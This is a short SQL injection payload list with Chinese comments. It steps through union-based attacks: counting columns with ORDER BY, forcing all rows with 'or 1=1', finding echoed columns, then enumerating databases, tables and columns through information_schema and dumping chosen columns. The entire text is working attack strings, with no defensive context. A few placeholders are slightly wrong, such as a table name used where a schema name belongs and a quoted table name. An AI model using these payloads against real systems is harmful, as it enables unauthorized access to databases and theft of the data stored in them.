-1' ORDER BY n-- ; 
#用于判断查询的列数
-1' or 1=1-- ;
#用于显示TABLE中所有查询列的结果
-1' UNION SELECT 1,2,3-- ;
#用于查看哪些列会回显
-1' UNION SELECT 1,2,group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA-- ;

-1' UNION SELECT 1,2,group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='[TABLE_NAME]'-- ;


-1' UNION SELECT 1,2,group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='[TABLE_NAME]'-- ;

-1' UNION SELECT 1,[COLUMN_NAME1], [COLUMN_NAME2] FROM '[TABLE_NAME]'-- ; 
